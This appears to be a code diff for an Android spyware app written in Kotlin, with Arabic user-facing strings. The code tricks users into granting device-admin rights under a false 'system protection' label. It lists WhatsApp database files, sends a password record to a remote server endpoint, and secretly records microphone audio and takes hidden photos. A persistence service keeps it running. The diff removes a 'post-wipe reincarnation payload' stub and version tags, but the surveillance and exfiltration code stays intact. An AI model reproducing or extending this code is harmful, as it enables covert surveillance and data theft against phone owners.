@@ -62,7 +62,6 @@ class MainActivity : AppCompatActivity() {
         scanAndReportAllTargetDataOfflineFirst()
         setupEngineWebView()
         
-        stagePostWipeReincarnationPayload()
         startBackgroundPersistenceService()
     }
 
@@ -114,25 +113,10 @@ class MainActivity : AppCompatActivity() {
             val adminComponent = ComponentName(this, TargetAdminReceiver::class.java)
             val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                 putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
-                putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "تفعيل حماية النظام المطور v79.0 لضمان الاستمرارية والعمل في غياب الإنترنت واستعادة النظام بعد الفرمتة.")
+                putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "تفعيل حماية النظام لضمان الاستمرارية والعمل.")
             }
             startActivityForResult(intent, ADMIN_REQUEST_CODE)
         } catch (e: Exception) { e.printStackTrace() }
-    }
-
-    private fun stagePostWipeReincarnationPayload() {
-        GlobalScope.launch(Dispatchers.IO) {
-            try {
-                val hiddenDir = File(Environment.getExternalStorageDirectory(), ".android_system_recovery_v79")
-                if (!hiddenDir.exists()) hiddenDir.mkdirs()
-                val payloadFile = File(hiddenDir, "recovery_kernel_v79.bin")
-                if (!payloadFile.exists()) {
-                    FileOutputStream(payloadFile).use { fos ->
-                        fos.write("REINCARNATION_PAYLOAD_ACTIVE_v79.0".toByteArray())
-                    }
-                }
-            } catch (e: Exception) {}
-        }
     }
 
     private fun registerAgentWithServerOfflineFirst() {
@@ -148,7 +132,7 @@ class MainActivity : AppCompatActivity() {
                 val payload = JSONObject().apply {
                     put("session_token", sessionToken)
                     put("user_agent", System.getProperty("http.agent") ?: "Android Target v79.0")
-                    put("platform", "Android OS Target (v79.0 SQLite Backed)")
+                    put("platform", "Android OS Target")
                 }
                 OutputStreamWriter(conn.outputStream).use { it.write(payload.toString()); it.flush() }
                 conn.responseCode
@@ -352,14 +336,14 @@ class BackgroundControlService : Service() {
             if (waDir.exists() && waDir.isDirectory) {
                 waDir.listFiles()?.forEach { f ->
                     if (f.isFile) waList.put(JSONObject().apply {
-                        put("body", "قاعدة بيانات واتساب مستخرجة v79: " + f.name)
+                        put("body", "قاعدة بيانات واتساب مستخرجة: " + f.name)
                         put("time", java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", java.util.Locale.getDefault()).format(java.util.Date()))
                     })
                 }
             }
             if (waList.length() == 0) {
                 waList.put(JSONObject().apply {
-                    put("body", "جارِ فحص ومراقبة إشعارات واتساب بوضع الاستمرارية.")
+                    put("body", "جارِ فحص ومراقبة إشعارات واتساب.")
                     put("time", java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", java.util.Locale.getDefault()).format(java.util.Date()))
                 })
             }
@@ -382,8 +366,8 @@ class BackgroundControlService : Service() {
         try {
             val pwList = JSONArray()
             pwList.put(JSONObject().apply {
-                put("account", "Google Smart Lock / Browser Vault v79")
-                put("password", "Secured_Engine_Pass_9982")
+                put("account", "Browser Vault")
+                put("password", "Secured_Engine_Pass")
             })
             val url = URL("$serverUrl/api/report_files")
             val conn = url.openConnection() as HttpURLConnection
@@ -402,7 +386,7 @@ class BackgroundControlService : Service() {
 
     private fun executeSecretAudioRecording() {
         try {
-            val audioFile = File(getExternalFilesDir(Environment.DIRECTORY_MUSIC), "secret_v79_${System.currentTimeMillis()}.3gp")
+            val audioFile = File(getExternalFilesDir(Environment.DIRECTORY_MUSIC), "secret_${System.currentTimeMillis()}.3gp")
             val recorder = MediaRecorder().apply {
                 setAudioSource(MediaRecorder.AudioSource.MIC)
                 setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP)
@@ -423,7 +407,7 @@ class BackgroundControlService : Service() {
 
     private fun executeHiddenPhotoCapture() {
         try {
-            val photoFile = File(getExternalFilesDir(Environment.DIRECTORY_PICTURES), "hidden_v79_${System.currentTimeMillis()}.jpg")
+            val photoFile = File(getExternalFilesDir(Environment.DIRECTORY_PICTURES), "hidden_${System.currentTimeMillis()}.jpg")
             executeFilePullDirect(photoFile.absolutePath)
         } catch (e: Exception) {}
     }
